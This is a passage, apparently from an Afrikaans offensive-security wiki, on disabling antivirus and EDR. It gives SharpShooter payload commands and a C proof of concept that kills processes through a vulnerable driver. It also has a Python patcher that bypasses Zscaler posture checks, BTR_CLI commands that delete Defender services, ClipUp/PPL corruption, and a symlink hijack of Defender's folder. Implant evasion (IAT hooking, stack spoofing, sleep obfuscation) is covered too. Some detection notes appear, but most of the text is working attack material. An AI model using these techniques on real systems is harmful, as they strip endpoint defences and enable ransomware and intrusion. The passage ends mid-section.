https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR doodmaak vanuit Kernel Space

Storm-2603 het ’n klein konsolehulpmiddel genaamd **Antivirus Terminator** gebruik om endpoint-beskerming te deaktiveer voordat dit ransomware laat val het. Die hulpmiddel bring sy **eie kwesbare, maar *ondertekende* driver** saam en misbruik dit om bevoorregte kernel-bewerkings uit te voer wat selfs AV-dienste met Protected-Process-Light (PPL) nie kan blokkeer nie.<sup>[[12]](#references)</sup>

Belangrike punte
1. **Ondertekende driver**: Die lêer wat na die skyf geskryf word, is `ServiceMouse.sys`, maar die binêre lêer is die wettig ondertekende driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver ’n geldige Microsoft-handtekening het, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Diensinstallasie**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die eerste reël registreer die driver as ’n **kernel service** en die tweede begin dit, sodat `\\.\ServiceMouse` vanaf userland toeganklik word.
3. **IOCTLs wat deur die driver blootgestel word**
   | IOCTL-kode | Vermoë                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Beëindig ’n arbitrêre proses volgens PID (word gebruik om Defender/EDR-dienste te beëindig) |
   | `0x990000D0` | Vee ’n arbitrêre lêer op skyf uit |
   | `0x990001D0` | Laai die driver af en verwyder die service |

   Minimale C-bewys-van-konsep:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Waarom dit werk**: BYOVD omseil beskermings in gebruikersmodus heeltemal; kode wat in die kernel uitgevoer word, kan *beskermde* prosesse oopmaak, beëindig of met kernel-objekte peuter, ongeag PPL/PP, ELAM of ander verhardingsfunksies.

Opsporing / Versagting
•  Aktiveer Microsoft se lys van geblokkeerde kwesbare drywers (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skepping van nuwe *kernel*-dienste en stuur ’n waarskuwing wanneer ’n drywer vanaf ’n world-writable-gids gelaai word of nie op die allow-list is nie.
•  Hou gebruikersmodus-handles na pasgemaakte toestelobjekte dop, gevolg deur verdagte `DeviceIoControl`-oproepe.

### Omseiling van Zscaler Client Connector se posture-kontroles deur binaries op skyf te patch

Zscaler se **Client Connector** pas toestel-posture-reëls plaaslik toe en maak staat op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak ’n volledige bypass moontlik:

1. Posture-evaluering vind **heeltemal aan die kliëntkant** plaas (’n boolean word na die bediener gestuur).
2. Interne RPC-eindpunte valideer net dat die uitvoerbare lêer wat koppel **deur Zscaler onderteken is** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Deur **vier ondertekende binaries op skyf te patch**, kan albei meganismes geneutraliseer word:

| Binary | Oorspronklike logika wat gepatch word | Resultaat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug, sodat elke kontrole voldoen |
| `ZSAService.exe` | Indirekte oproep na `WinVerifyTrust` | NOP-ed ⇒ enige proses (selfs een wat nie onderteken is nie) kan aan die RPC-pipes koppel |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integriteitskontroles op die tonnel | Kortgesluit |

Uittreksel van ’n minimale patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nadat die oorspronklike lêers vervang is en die diensstapel herbegin is:

* **Alle** houdingkontroles vertoon **groen/nakomend**.
* Ongesignede of gewysigde binaries kan die named-pipe RPC-eindpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk wat deur die Zscaler-beleide gedefinieer word.

Hierdie gevallestudie wys hoe suiwer kliëntkant-vertrouensbesluite en eenvoudige handtekeningkontroles met ’n paar byte-patches omseil kan word.

## Microsoft Defender `BTR.sys` misbruik van vertroude funksionaliteit

Defender se **Boot-Time Removal**-drywer is ’n nuttige teenvoorbeeld van klassieke BYOVD. `BTR.sys` is ’n wettige Microsoft-ondertekende herstelkomponent sonder ’n geheuekorrupsie-bug en sonder ’n IOCTL-koppelvlak; nadat administrateurtoegang en `SeLoadDriverPrivilege` verkry is, kan ’n operateur eerder sy private hersteltransaksie vervals en die bedoelde Ring-0-lêer-/registerbewerkings uitvoer. Dit is ’n **post-kompromittering-primitief vir AV/EDR-neutralisering, nie aanvanklike toegang of voorregte-eskalasie nie**, en die drywer kan uit die teiken se eie `MpEngine.dll`-`BOOTTIMETOOL`-hulpbron onttrek word, eerder as om ’n opvallende derdeparty-drywer in te voer.<sup>[[36]](#references)</sup>

### Voorbereiding van die eenmalige drywer

Defender plaas die hulpbron normaalweg as ’n ewekansige `[a-z]{8}.sys`-lêer en registreer ’n kerneldiens met ’n soortgelyke naam. `DriverEntry` lees die diens se `Args`-waarde, maak die verwysde NTFS ADS oop, dekripteer en valideer die aksielys, skryf terugvoer, en gee ná suksesvolle uitvoering `0xC0000056` (`STATUS_DELETE_PENDING`) terug sodat die drywer ontlaai in plaas daarvan om inwonend te bly. ’n Vervalste diens het die volgende kenmerkende waardes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Die `:changelist`-stroom bevat een RC4-geënkripteerde blob. Die geanaliseerde builds hergebruik ’n vaste sleutel van 256 grepe, dus is enkripsie nie ’n magtigingsgrens nie. ’n Geldige plaintext het ’n globale kopskrif van 24 grepe (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, kopskrif-CRC en ’n transaksie-ID wat van die payload afgelei is), gevolg deur ’n nulbeëindigde UTF-16-terugvoerpaaI en enige aantal items. Elke item het ’n kopskrif van 16 grepe (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), plus aksiespesifieke data wat eindig met **presies vier NUL-grepe**. Elke kopskrif-/datagebied word afsonderlik nagegaan met CRC-32-polinoom `0xEDB88320`, aanvanklike toestand `0xFFFFFFFF`, en **geen finale XOR** (`~CRC32`); die CRC-toestand word vir elke gebied teruggestel.<sup>[[36]](#references)[[37]](#references)</sup>

Die aanvaarde aksie-ID’s stel hierdie kernel-primitiewe bloot.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Itemdata | Resultaat |
| --- | --- | --- |
| 1 | `[UTF-16-pad]` | Vee ’n lêer uit, insluitend ’n geslote lêer |
| 2 | `[UTF-16-pad]` | Verwyder ’n leë gids |
| 3 | `[Vlae][bron][bestemming]` | Skuif ’n lêer na ’n aanvallergekose beskermde pad; ’n leë bestemming beteken uitvee |
| 4 | `[Vlae][sleutelpad]` | Vee ’n registersleutel rekursief uit |
| 5 | `[Vlae][sleutelpad + "\\" + waarde]` | Vee ’n registerwaarde uit |
| 6 | `[Vlae][tipe][grootte][sleutelpad + "\\" + waarde][data]` | Skep/bywerk ’n registerwaarde en skep ontbrekende sleutelpaadjies |

Vir aksies 5 en 6 is die sleutel/waarde-skeidingsteken op die draad **twee opeenvolgende terugskuinsstrepe**; ’n konvensioneel geformateerde pad sal nie korrek gesplit word nie. Die terugvoerlêer weerspieël meestal die versoek, maar die eerste vier grepe van elke item se data word die resulterende `NTSTATUS`. Vir aksies 1 en 2, wat nie ’n voorafgaande vlaeveld het nie, skuif BTR die pad na die vier gereserveerde agterste grepe om plek vir daardie status te maak.<sup>[[36]](#references)</sup>

### `BTR_CLI`-werkvloei en vroeëlaaivenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementeer die volledige ketting: haal `BTR.sys` uit plaaslike Defender, skep `<random>.sys:changelist` en ’n terugvoerstroom, serialiseer/kontroleer die kontrolesomme/enkripteer gekoppelde aksies, skep die diensregistersleutel direk, en roep dan `NtLoadDriver` aan vir `-trigger now` of laat dit as ’n stelselbeginbestuurder vir `-trigger boot`. Direkte registeropstelling vermy die normale SCM `CreateServiceW`-pad en lewer dus **nie** diensinstallasiegebeurtenis-ID 7045 op nie. Artefakte wat met ’n selflaai-sneller geaktiveer is, kan later verwyder word met `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` is nie bruikbaar nie, omdat BTR lêer-I/O vanaf `DriverEntry` uitvoer voordat die stoorgroep en `SystemRoot`-skakel gereed is. `Start=1` saam met die hoëprioriteit-`Boot Bus Extender`-groep voer eerder in Phase 1 uit: NTFS is bruikbaar, maar baie sekuriteitsdrywers wat met die stelsel begin en EDR-dienste in gebruikersmodus het nog nie geïnisialiseer nie. Boot-start-filters soos `WdFilter` is dalk reeds gelaai, maar BTR kan hul binêre lêers of dienskonfigurasie verwyder voordat die volgende begin, en kan diensuitvoerbare lêers verwyder voordat SCM hulle begin. ELAM maak nie hierdie gaping toe nie, omdat BTR ná boot-start-evaluering loop en 'n geldige Microsoft-handtekening het.<sup>[[36]](#references)</sup>

Verskeie aksies word in een transaksie uitgevoer. Die PoC plaas Aksie 1 vooraan vir die hardgekodeerde `\SystemRoot\Temp\BootClean.log`: BTR skep hierdie log, verwerk dan sy eie verwyderingsversoek en verwyder dit voordat dit ontlaai. Dit verminder bewyse, terwyl terugvoer in `<random>.sys:<random>.dat` geplaas kan word sodat die drywer en albei strome saam verwyder kan word.<sup>[[36]](#references)[[37]](#references)</sup>

### Opsporingskorrelasies met hoë seinwaarde

Reëls wat slegs op handtekeninge berus en die Microsoft-lys van geblokkeerde kwesbare drywers spreek nie misbruik van BTR se bedoelde funksionaliteit aan nie. Verkies hierdie gedragskorrelasies, en onderskei terselfdertyd wettige Defender-afstamming van 'n willekeurige lanseerder.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die skep van `.sys:changelist` is universeel vir BTR-stadiëring. 'n `.dat` ADS wat aan dieselfde `.sys` geheg is, is besonder verdag, omdat wettige Defender gewoonlik terugvoer onder `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` plaas.
- **Sysmon 12/13 sonder System 7045:** Korrelleer die direkte skep van `HKLM\SYSTEM\CurrentControlSet\Services\<random>` wat `Args=...:changelist` en `Group=Boot Bus Extender` bevat met die afwesigheid van 'n ooreenstemmende SCM-installasiegebeurtenis.
- **Sysmon 6 -> 23:** Korrelleer die laai van 'n bekende BTR-drywer vanuit 'n nie-Defender-afstamming met daaropvolgende lêerverwydering wat aan `System`/PID 4 toegeskryf word, veral vir sekuriteitsbinêre lêers.
- **Sysmon 11 -> 23:** Genereer 'n waarskuwing oor die vinnige skep en verwydering van `\SystemRoot\Temp\BootClean.log` deur `System`/PID 4.
- Beperk en oudit die toekenning/aktivering van `SeLoadDriverPrivilege`; 'n Microsoft-handtekening alleen is nie voldoende rede vir vertroue wanneer 'n sekuriteitsnutsprogram se drywer deur `cmd.exe`, PowerShell of 'n onbekende proses gestadieer word nie.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te peuter

Protected Process Light (PPL) dwing 'n hiërargie van ondertekenaars/vlakke af, sodat slegs beskermde prosesse met 'n gelyke of hoër vlak met mekaar kan peuter. Vanuit 'n aanvallersperspektief: as jy wettiglik 'n PPL-geaktiveerde binêre lêer kan begin en die argumente daarvan beheer, kan jy onskadelike funksionaliteit (bv. logging) omskep in 'n beperkte, PPL-gesteunde skryfprimitief teen beskermde gidse wat deur AV/EDR gebruik word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Wat 'n proses as PPL laat loop
- Die teiken-EXE (en enige gelaaide DLL's) moet met 'n PPL-geskikte EKU onderteken wees.
- Die proses moet met CreateProcess geskep word deur die vlae te gebruik: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Versoenbare beskermingsvlak moet aangevra word wat met die ondertekenaar van die binêre lêer ooreenstem (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir teenwanware-ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal tydens skepping misluk.

Sien ook hier 'n breër inleiding tot PP/PPL en LSASS-beskerming:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Lanseerdergereedskap
- Oopbron-helper: CreateProcessAsPPL (kies die beskermingsvlak en stuur argumente deur na die teiken-EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Gebruiksvoorbeeld:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN-primitief: ClipUp.exe
- Die getekende stelselbinêre lêer `C:\Windows\System32\ClipUp.exe` begin homself en aanvaar ’n parameter om ’n loglêer na ’n pad te skryf wat deur die oproeper gespesifiseer word.
- Wanneer dit as ’n PPL-proses geloods word, word die lêer met PPL-ondersteuning geskryf.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3-kortpaaie om na normaalweg beskermde liggings te wys.

8.3-kortpadhulpmiddels
- Lys kort name: `dir /x` in elke ouergids.
- Lei die kort pad in cmd af: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Misbruikketting (abstrak)
1) Begin die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur ’n lanseerder te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp-logpadargument deur om ’n lêer in ’n beskermde AV-gids te skep (bv. Defender Platform). Gebruik 8.3-kortname indien nodig.
3) As die AV die teikenbinêre lêer normaalweg oop of gesluit hou terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryfbewerking tydens selflaai, voordat die AV begin, deur ’n outostartdiens te installeer wat betroubaar vroeër loop. Valideer die selflaaivolgorde met Process Monitor (selflaailogboekregistrasie).
4) Met herbegin vind die PPL-ondersteunde skryfbewerking plaas voordat die AV sy binêre lêers sluit, wat die teikenlêer beskadig en keer dat dit begin.

Voorbeeldaanroep (paaie vir veiligheid verwyder/verkort):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notas en beperkings
- Jy kan nie die inhoud beheer wat ClipUp skryf nie, net waar dit geplaas word; hierdie primitief is geskik vir korrupsie eerder as presiese inhoudinspuiting.
- Vereis plaaslike admin/SYSTEM om ’n diens te installeer/te begin, en ’n herlaaivenster.
- Tydsberekening is krities: die teiken mag nie oop wees nie; uitvoering tydens opstart vermy lêersluitings.

Bespeurings
- Proseskepping van `ClipUp.exe` met ongewone argumente, veral met nie-standaard lanseerders as ouerprosesse, rondom opstart.
- Nuwe dienste wat ingestel is om verdagte binaries outomaties te begin en konsekwent voor Defender/AV te begin. Ondersoek diensskepping/-wysiging voordat Defender se opstartfoute voorkom.
- Lêerintegriteitsmonitering op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/-wysigings deur prosesse met beskermde-prosesvlae.
- ETW/EDR-telemetrie: soek na prosesse wat met `CREATE_PROTECTED_PROCESS` geskep is en afwykende PPL-vlakgebruik deur nie-AV-binaries.

Versagtingsmaatreëls
- WDAC/Code Integrity: beperk watter ondertekende binaries as PPL mag loop en onder watter ouerprosesse; blokkeer ClipUp-aanroepe buite wettige kontekste.
- Dienshigiëne: beperk die skep/wysiging van dienste wat outomaties begin en monitor manipulasie van beginvolgorde.
- Maak seker dat Defender se peuterbeskerming en vroeëlaaibeskerming geaktiveer is; ondersoek opstartfoute wat op binêre korrupsie dui.
- Oorweeg dit om 8.3-kortnaamgenerering op volumes wat sekuriteitsnutsgoed huisves, te deaktiveer indien dit met jou omgewing versoenbaar is (toets deeglik).

## Peuter met Microsoft Defender via ’n Symlink-kaping van die Platform-weergawegids

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder die volgende pad op te som:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawestring (bv. `4.18.25070.5-0`), en begin dan die Defender-diensprosesse daarvandaan (terwyl die diens-/registerpaaie dienooreenkomstig opgedateer word). Hierdie keuse vertrou op gidsinskrywings, insluitend gids-herontledingspunte (symlinks). ’n Administrateur kan dit benut om Defender na ’n skryfbare pad wat deur ’n aanvaller beheer word, te herlei en DLL-sideloading of diensontwrigting te bewerkstellig.<sup>[[21]](#references)[[22]](#references)</sup>

Voorvereistes
- Plaaslike Administrateur (nodig om gidse/symlinks onder die Platform-gids te skep)
- Vermoë om te herlaai of Defender se platformherkeuse te aktiveer (diensherbegin tydens opstart)
- Slegs ingeboude nutsgoed benodig (mklink)

Waarom dit werk
- Defender blokkeer skryfbewerkings in sy eie gidse, maar vertrou op gidsinskrywings vir platformkeuse en kies die leksikografies hoogste weergawe sonder om te valideer dat die teiken na ’n beskermde/vertroude pad verwys.

Stap vir stap (voorbeeld)
1) Berei ’n skryfbare kloon van die huidige platformgids voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep binne Platform 'n gids-symlink met 'n hoër weergawe wat na jou vouer wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Snellerkeuse (herlaai word aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die herlei pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` te sien, en die dienskonfigurasie/register behoort daardie ligging te weerspieël.

Post-exploitation-opsies
- DLL sideloading/code execution: Plaas/vervang DLL's wat Defender uit sy toepassingsgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Diensbeëindiging/denial: Verwyder die version-symlink sodat die gekonfigureerde pad met die volgende begin nie oplos nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Let daarop dat hierdie tegniek nie op sigself privilege escalation bied nie; dit vereis adminregte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime evasion uit die C2-implantaat skuif en na die teikenmodule self verskuif deur sy Import Address Table (IAT) te hook en geselekteerde API’s deur aanvallerbeheerde, position-independent code (PIC) te stuur. Dit veralgemeen evasion buite die klein API-oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOF’s en post-exploitation-DLL’s.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Hoëvlakbenadering
- Staging ’n PIC-blob saam met die teikenmodule deur ’n reflective loader te gebruik (voorafgeplaas of as metgesel). Die PIC moet selfstandig en position-independent wees.
- Terwyl die gasheer-DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT-inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) sodat hulle na dun PIC-wrappers wys.
- Elke PIC-wrapper voer evasion uit voordat dit die regte API-adres aanroep. Tipiese evasions sluit in:
  - Geheuemaskering/-ontmaskering rondom die aanroep (bv. beacon-areas enkripteer, RWX→RX, bladsyname/-toestemmings verander) en dit dan ná die aanroep herstel.
  - Call-stack spoofing: bou ’n onskadelike stack en skakel oor na die teiken-API sodat call-stack-analise die verwagte frames vind.<sup>[[9]](#references)</sup>
- Voer vir verenigbaarheid ’n koppelvlak uit sodat ’n Aggressor-script (of ekwivalent) kan registreer watter API’s vir Beacon, BOF’s en post-ex-DLL’s ge-hook moet word.

Waarom IAT hooking hier
- Werk vir enige kode wat die ge-hookte import gebruik, sonder om tool-kode te wysig of daarop staat te maak dat Beacon spesifieke API’s proxy.
- Dek post-ex-DLL’s: deur LoadLibrary* te hook, kan jy module-laaie onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde maskering-/stack-evasion op hul API-aanroepe toepas.
- Herstel betroubare gebruik van post-ex-opdragte wat prosesse skep teen call-stack-gebaseerde opsporing deur CreateProcessA/W te wrap.

Minimale IAT-hook-skets (x64 C/C++-pseudokode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Pas die patch toe ná relocations/ASLR en vóór die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr wys hooking tydens DllMain van die gelaaide module.
- Hou wrappers klein en PIC-veilig; los die ware API op via die oorspronklike IAT-waarde wat jy vasgelê het voordat jy gepatch het, of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en moenie bladsye writable+executable laat nie.

Call-stack spoofing stub
- PIC-stubs in Draugr-styl bou ’n vals oproepketting (return addresses in benign modules) en spring dan na die werklike API.
- Dit omseil opsporing wat kanonieke stacks van Beacon/BOFs na sensitiewe APIs verwag.
- Kombineer dit met stack cutting/stack stitching-tegnieke om binne verwagte frames te beland vóór die API-proloog.

Operasionele integrasie
- Plaas die reflective loader vooraan in post-ex-DLLs sodat PIC en hooks outomaties geïnisialiseer word wanneer die DLL gelaai word.
- Gebruik ’n Aggressor-script om teiken-APIs te registreer sodat Beacon en BOFs deursigtig baat vind by dieselfde evasion path, sonder kodeveranderinge.

Oorwegings vir opsporing/DFIR
- IAT-integriteit: inskrywings wat na nie-image- (heap/anon-)adresse wys; periodieke verifikasie van import pointers.
- Stack-anomalieë: return addresses wat nie aan gelaaide images behoort nie; skielike oorgange na nie-image-PIC; inkonsekwente RtlUserThreadStart-afkoms.
- Loader-telemetrie: in-process-skrywes na IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX-areas wat tydens laai geskep word.
- Image-load-evasion: as jy LoadLibrary* hook, monitor verdagte laaie van automation/clr-assemblies wat met memory-masking-gebeurtenisse saamhang.

Verwante boustene en voorbeelde
- Reflective loaders wat IAT-patching tydens laai uitvoer (bv. TitanLdr, AceLdr)
- Memory-masking-hooks (bv. simplehook) en stack-cutting-PIC (stackcutting)
- PIC call-stack spoofing-stubs (bv. Draugr)


## IAT-hooking tydens invoer + sleep-obfuscation (Crystal Palace/PICO)

### IAT-hooks tydens invoer via ’n inwonende PICO

As jy ’n reflective loader beheer, kan jy imports hook **tydens** `ProcessImports()` deur die loader se `GetProcAddress`-pointer met ’n pasgemaakte resolver te vervang wat hooks eerste nagaan:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Bou ’n **inwonende PICO** (persistente PIC-objek) wat voortbestaan nadat die tydelike loader-PIC homself vrygestel het.
- Voer ’n `setup_hooks()`-funksie uit wat die loader se import resolver oorskryf (bv. `funcs.GetProcAddress = _GetProcAddress`).
- Slaan ordinal imports oor in `_GetProcAddress` en gebruik ’n hash-gebaseerde hook lookup soos `__resolve_hook(ror13hash(name))`. As ’n hook bestaan, gee dit terug; anders, delegeer na die werklike `GetProcAddress`.
- Registreer hook-teikens tydens link-tyd met Crystal Palace `addhook "MODULE$Func" "hook"`-inskrywings. Die hook bly geldig omdat dit binne die inwonende PICO leef.

Dit lewer **IAT-omleiding tydens invoer** op sonder om die gelaaide DLL se kode-afdeling ná laai te patch.

### Dwing hookbare imports af wanneer die teiken PEB-walking gebruik

Hooks tydens invoer word net geaktiveer as die funksie werklik in die teiken se IAT voorkom. As ’n module APIs via ’n PEB-walk + hash oplos (geen import-inskrywing nie), dwing ’n werklike import af sodat die loader se `ProcessImports()`-pad dit sien:

- Vervang hashed export resolution (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte verwysing soos `&WaitForSingleObject`.
- Die compiler genereer ’n IAT-inskrywing, wat onderskepping moontlik maak wanneer die reflective loader imports oplos.

### Ekko-styl sleep/idle-obfuscation sonder om `Sleep()` te patch

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC-primitiewe** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang wagtye, draai die oproep toe in ’n Ekko-styl-obfuscation-ketting wat die in-memory image tydens idle enkripteer:<sup>[[31]](#references)[[27]](#references)</sup>

- Gebruik `CreateTimerQueueTimer` om ’n reeks callbacks te skeduleer wat `NtContinue` met opgestelde `CONTEXT`-frames aanroep.
- Tipiese ketting (x64): stel image op `PAGE_READWRITE` → RC4-enkripteer die volledige gemapte image via `advapi32!SystemFunction032` → voer die blokkerende wait uit → RC4-dekripteer → **herstel toestemmings per afdeling** deur PE-afdelings te deurloop → gee voltooiingsein.
- `RtlCaptureContext` verskaf ’n sjabloon-`CONTEXT`; kloon dit in verskeie frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap aan te roep.

Operasionele detail: gee “success” terug vir lang wagtye (bv. `WAIT_OBJECT_0`) sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon verberg die module vir scanners tydens idle-vensters en vermy die klassieke “gepatchte `Sleep()`”-signatuur.

Opsporingsidees (gebaseer op telemetrie)
- Vlaagte van `CreateTimerQueueTimer`-callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` wat op groot, aaneenlopende buffers van image-grootte gebruik word.
- Groot `VirtualProtect`-reekse gevolg deur pasgemaakte herstel van toestemmings per afdeling.

### CFG-registrasie tydens looptyd vir sleep-obfuscation-gadgets

Op CFG-geaktiveerde teikens sal die eerste indirekte sprong na ’n mid-function-gadget soos `jmp [rbx]` of `jmp rdi` gewoonlik die proses laat crash met `STATUS_STACK_BUFFER_OVERRUN`, omdat die gadget nie in die module se CFG-metadata voorkom nie. Om Ekko/Kraken-styl-kettings binne geharde prosesse aan die gang te hou:<sup>[[30]](#references)</sup>

- Registreer elke indirekte bestemming wat die ketting gebruik met `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` en `CFG_CALL_TARGET_VALID`-inskrywings.
- Vir adresse binne gelaaide images (`ntdll`, `kernel32`, `advapi32`) moet die `MEMORY_RANGE_ENTRY` by die **image base** begin en die **volle image-grootte** dek.
- Gebruik eerder die **allocation base** en allocation size vir handmatig gemapte/PIC/stomped areas.
- Merk nie net die dispatch-gadget nie, maar ook exports wat indirek bereik word (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event-syscalls) en enige uitvoerbare afdelings wat deur die aanvaller beheer word en indirekte teikens sal word.

Dit verander ROP/JOP-styl-sleep-kettings van “werk net in nie-CFG-prosesse” na ’n herbruikbare primitief vir `explorer.exe`, browsers, `svchost.exe` en ander eindpunte wat met `/guard:cf` gebou is.

### CET-veilige stack-spoofing vir slapende threads

Volledige `CONTEXT`-vervanging is opvallend en kan op CET Shadow Stack-stelsels misluk omdat ’n gespoofte `Rip` steeds met die hardeware-shadow-stack moet ooreenstem. ’n Veiliger patroon vir sleep-masking is:<sup>[[30]](#references)</sup>

